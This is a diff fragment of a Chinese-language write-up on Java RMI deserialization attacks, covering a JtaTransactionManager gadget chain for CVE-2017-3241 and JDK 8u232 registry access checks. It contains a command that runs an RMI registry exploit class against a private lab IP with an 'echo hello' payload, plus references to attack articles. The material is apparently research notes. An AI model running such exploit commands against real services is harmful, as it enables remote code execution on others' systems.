-        return (UserTransaction)getJndiTemplate().lookup(userTransactionName, UserTransaction.class);
-    }
-    catch (NamingException ex)
-    {
-        throw new TransactionSystemException("JTA UserTransaction is not available at JNDI location [" + userTransactionName + "]", ex);
-    }
-}
---------------------------------------------------------------------------
+java_8_232 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryExploitWithHashtable2 192.168.65.23 1099 \
+http://192.168.65.23:8080/ DoSomething 1 \
+"echo hello"
 
-起初我参照fake版PublicKnown2实现fake版JtaTransactionManager，继承Message2，
-测试时发现服务端总在前述568行处抛出空指针异常，this.logger为null。但同样是
-JtaTransactionManager利用链，用VulnerableServer测试时可以得手，于是调试
-VulnerableServer，看this.logger到底在哪里被赋值，就这样找到
-AbstractPlatformTransactionManager.readObject()。
+客户端看到的是:
 
-再回头看[47]，作者其实点了这件事，他提到要稍作修改Message，他那个修改版
-Message继承了AbstractPlatformTransactionManager。作者没有说为什么需要稍作
-修改，也没有强调必须做这个修改，看他文章时就没在意。
+Registry.rebind disallowed; origin /192.168.65.20 is non-local host
 
-这个洞的本质就是Message、PublicKnown所演示的那样。如今看来，随着所挑选的
-PublicKnown不同，对Message产生的约束也不同。现实中Message不可控，不可能为
-了适配fake版JtaTransactionManager，改出个Message3来。如果服务端本来就没有
-使用Message3的等价类，JtaTransactionManager利用链无法成功。对那些Java框架、
-Java中间件完全不了解，现实世界中有哪个动态端口使用Message3的等价类吗？
+而不是:
+
+filter status: REJECTED
+
+8u232将RegistryImpl.checkAccess()前置，比白名单机制强多了。
 
 ☆ 参考资源
 
-[47]
-    Java RMI远程反序列化任意类及远程代码执行解析(CVE-2017-3241) - jfeiyi [2017-02-15]
-    https://www.freebuf.com/vuls/126499.html
+[57]
+    RMI反序列化漏洞分析 - 合天智汇 [2019-08-16]
+    https://www.jianshu.com/p/1a6f32f7bafc
+    https://baijiahao.baidu.com/s?id=1641986524548861404
 
-    https://packetstormsecurity.com/files/download/141104/cve-2017-3241.pdf
-    https://dl.packetstormsecurity.net/1702-exploits/cve-2017-3241.pdf
+[59]
+    JAVA RMI反序列化流程原理分析 - orich1 [2018-03-28]
+    https://xz.aliyun.com/t/2223
+    (有个报错回显的例子，在文中搜do_exec)
 
-    Oracle Critical Patch Update Advisory January 2017
-    https://www.oracle.com/security-alerts/cpujan2017.html
+[60]
+    Relax RMI Registry Serial Filter to allow arrays of any type - [2017-07-28]
+    https://bugs.openjdk.java.net/browse/JDK-8185539
+    (这有sun.rmi.registry.registryFilter的示例)
 
-    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-3241
-
-[62]
-    Attacking Java RMI services after JEP 290 - Hans Martin Munch [2019-03]
-    https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/
+    Serialization Filtering
+    https://docs.oracle.com/javase/10/core/serialization-filtering1.htm
